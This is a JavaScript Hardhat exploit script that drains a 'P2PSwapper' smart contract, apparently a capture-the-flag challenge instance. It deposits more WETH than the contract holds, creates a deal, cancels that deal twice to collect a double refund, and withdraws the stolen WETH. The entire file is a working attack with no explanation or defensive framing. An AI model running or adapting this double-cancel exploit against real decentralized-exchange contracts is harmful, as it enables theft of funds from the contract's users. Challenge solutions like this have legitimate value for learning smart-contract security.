const hre = require("hardhat");
const { expect } = require("chai");

async function main() {
  const provider = new ethers.providers.Web3Provider(network.provider);

  const [deployer] = await ethers.getSigners();
  console.log("[*] attacker address:", deployer.address);
  console.log("[*] attacker balance:", (await deployer.getBalance()).toString());

  const instanceAddress = process.env.INSTANCE_ADDRESS;
  console.log("[*] instance address:", instanceAddress);

  const P2PSwapper = await hre.ethers.getContractFactory("P2PSwapper");
  const swapper = await P2PSwapper.attach(instanceAddress);

  const p2pwethAddress = (await swapper.p2pweth());
  console.log("[*] p2p WETH address:", p2pwethAddress);

  const P2P_WETH = await hre.ethers.getContractFactory("P2P_WETH");
  const p2pweth = await P2P_WETH.attach(p2pwethAddress);

  const totalBalance = (await p2pweth.balanceOf(instanceAddress));
  console.log("[*] DEX balance (in WETH):", totalBalance.toString());
  console.log("[*] attacker balance (in WETH):", (await p2pweth.balanceOf(deployer.address)).toString());


  console.log("[*] deals count:", (await swapper.dealCount()).toString());

  let deal = await swapper.deals(1);
  console.log("[*] deal #1 info:")
  console.log(deal);

  console.log("[*] fees for owner:", (await swapper.partnerFees(1)).toString());

  if((await swapper.userByAddress(deployer.address)).eq(0)) {
    console.log("[*] signing up..")
    let tx = await swapper['signup()']();
    await tx.wait();
    console.log("[*] signed up")
  }

  let swapAmount = totalBalance.add(31338);

  console.log("[*] depositing some WETH..");
  tx = await p2pweth.deposit({value: swapAmount});
  await tx.wait();
  console.log("[*] attacker balance (in WETH):", (await p2pweth.balanceOf(deployer.address)).toString());

  tx = await p2pweth.approve(instanceAddress, swapAmount);
  await tx.wait();

  let dealId = (await swapper.dealCount()).toNumber() + 1;

  console.log("[*] creating new deal");
  tx = await swapper.createDeal(p2pwethAddress, swapAmount, p2pwethAddress, 1, {value: 31338});
  await tx.wait();
  console.log("[*] DEX balance (in WETH):", (await p2pweth.balanceOf(instanceAddress)).toString());
  console.log("[*] attacker balance (in WETH):", (await p2pweth.balanceOf(deployer.address)).toString());

  deal = await swapper.deals(dealId);
  console.log("[*] deal info:")
  console.log(deal);

  console.log("[*] cancelling deal for the first time..");
  tx = await swapper.cancelDeal(dealId);
  await tx.wait();
  console.log("[*] DEX balance (in WETH):", (await p2pweth.balanceOf(instanceAddress)).toString());
  console.log("[*] attacker balance (in WETH):", (await p2pweth.balanceOf(deployer.address)).toString());

  console.log("[*] cancelling deal for the second time..");
  tx = await swapper.cancelDeal(dealId);
  await tx.wait();
  console.log("[*] DEX balance (in WETH):", (await p2pweth.balanceOf(instanceAddress)).toString());
  console.log("[*] attacker balance (in WETH):", (await p2pweth.balanceOf(deployer.address)).toString());

  console.log("[*] withdrawing WETH..");
  let balance = (await p2pweth.balanceOf(deployer.address));
  tx = await p2pweth.withdraw(balance);
  await tx.wait();
  console.log("[*] attacker balance (in WETH):", (await p2pweth.balanceOf(deployer.address)).toString());

  console.log("[+] success")
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
